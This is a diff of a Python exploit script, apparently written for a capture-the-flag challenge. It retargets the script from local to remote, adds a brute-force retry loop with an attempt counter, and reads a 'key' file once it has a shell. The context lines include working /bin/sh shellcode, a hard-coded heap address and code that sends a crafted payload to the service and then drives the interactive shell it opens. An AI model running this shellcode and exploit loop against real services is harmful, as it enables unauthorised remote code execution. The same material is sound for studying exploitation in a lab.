@@ -13,7 +13,7 @@ import errno
 #                                                                             # 
 ###############################################################################
 
-LOCAL = True
+LOCAL = False
 DEBUG = False
 
 if LOCAL:
@@ -32,6 +32,8 @@ HEAP_ADDRESS = "\x0b\x45\xc0\x08"
 
 # Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
 SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+
+attempts = 0
 
 ################################################################################
 #
@@ -188,7 +190,6 @@ def send_movie(movie,con):
 ################################################################################
 def go_interactive(con):
 
-    print "Entering interactive mode:"
 
     con.write("ls\n")
     time.sleep(1)
@@ -198,6 +199,9 @@ def go_interactive(con):
         return False
 
     con.write("cat key\n")
+
+    print "\aSuccess! Attempts: " + `attempts`
+    print "Entering interactive mode:"
 
     while True:
         time.sleep(1)
@@ -396,8 +400,8 @@ def build_movie():
 ################################################################################
 
 while True:
-
-    print "Attempting exploit.."
+    attempts += 1
+    print "Initiating exploit... Attempt #" + `attempts`
 
     # Start the connection
     con = connect()
